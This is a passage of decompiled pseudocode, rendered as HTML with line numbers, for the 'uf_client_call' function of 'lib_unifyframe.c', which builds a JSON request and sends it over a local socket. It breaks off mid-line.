class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v42; <span class="comment">// $t0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v43; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v44; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v47; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v49; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v53[<span class="number">128</span>]; <span class="comment">// [sp+30h] [-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// [sp+B0h] [-10h]</span></span><br><span class="line">  <span class="type">int</span> v55; <span class="comment">// [sp+B4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [sp+B8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v55 = <span class="number">0</span>;</span><br><span class="line">    v54 = <span class="number">38</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  getpid();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) || !*(_DWORD *)(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)cmd or module is null&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = json_object_new_object();</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)json_object_new_object failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v14, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">453</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v14;</span><br><span class="line">      v12 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v13 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v13, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">443</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v13;</span><br><span class="line">      v12 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v7 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v7, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">433</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v7;</span><br><span class="line">      v12 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v15, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">463</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v15;</span><br><span class="line">      v12 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">      v17 = <span class="built_in">calloc</span>(v16, <span class="number">1</span>);</span><br><span class="line">      v8 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( !v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">473</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, v9);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = v17;</span><br><span class="line">      v11 = v16;</span><br><span class="line">      v12 = <span class="string">&quot;ufSys.%s&quot;</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(v10, v11, v12, v6) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(v8);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = json_object_new_string(v8);</span><br><span class="line">      <span class="built_in">free</span>(v8);</span><br><span class="line">      <span class="keyword">if</span> ( !v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;method&quot;</span>, v18);</span><br><span class="line">      v19 = json_object_new_object();</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v19);</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;module&quot;</span>, v20);</span><br><span class="line">      v21 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v21 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      v22 = json_object_new_string(v21);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;remoteIp&quot;</span>, v22);</span><br><span class="line">LABEL_34:</span><br><span class="line">      v23 = *(_DWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = json_object_new_string(v23);</span><br><span class="line">        <span class="keyword">if</span> ( !v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_passwd failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;remotePwd&quot;</span>, v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">36</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = json_object_new_int();</span><br><span class="line">        <span class="keyword">if</span> ( !v25 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_remoteip failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;buf&quot;</span>, v25);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v27 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 )</span><br><span class="line">            json_object_object_add(v19, <span class="string">&quot;force&quot;</span>, v27);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_54:</span><br><span class="line">            json_object_object_add(v29, v30, v28);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_56:</span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_url&quot;</span>, v31);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_file&quot;</span>, v32);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;multi&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;not_commit&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(*(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;async&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      v36 = *(_BYTE **)(a1 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v36 || !*v36 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      v37 = json_object_new_string(v36);</span><br><span class="line">      <span class="keyword">if</span> ( !v37 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;data&quot;</span>, v37);</span><br><span class="line">LABEL_75:</span><br><span class="line">      v38 = *(_BYTE **)(a1 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v38 &amp;&amp; *v38 )</span><br><span class="line">      &#123;</span><br><span class="line">        v39 = json_object_new_string(v38);</span><br><span class="line">        <span class="keyword">if</span> ( !v39 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_78:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_data failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;device&quot;</span>, v39);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;params&quot;</span>, v19);</span><br><span class="line">      v40 = json_object_to_json_string(v4);</span><br><span class="line">      <span class="keyword">if</span> ( !v40 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new json_object_to_json_string send buf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v41 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v41 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        v42 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">12</span>);</span><br><span class="line">        v43 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>);</span><br><span class="line">        v44 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">        v45 = *(_DWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">651</span>,</span><br><span class="line">              *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">16</span>),</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44,</span><br><span class="line">              v42);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">662</span>,</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v46 = <span class="built_in">strlen</span>(v40);</span><br><span class="line">      uf_socket_msg_write(v41, v40, v46);</span><br><span class="line">      json_object_put(v4);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) &amp;&amp; *(_BYTE *)(a1 + <span class="number">41</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_socket_close(v41);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v56 = <span class="number">1</span> &lt;&lt; (v41 &amp; <span class="number">0x1F</span>);</span><br><span class="line">      v47 = &amp;v53[<span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v41 &gt;&gt; <span class="number">5</span>)];</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v50 = <span class="number">4</span> * v48;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &lt; <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    *(_DWORD *)v47 |= v56;</span><br><span class="line">    v51 = select(v41 + <span class="number">1</span>, v53, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v51 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select timeout[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v51 &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v49 = (_DWORD *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( (*v49 &amp; <span class="number">0xFFFFFFF7</span>) != <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      strerror(*v49);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select error %s&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)socket EINTR or ENOMEM [%d]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">691</span>, *v49);</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v50 = <span 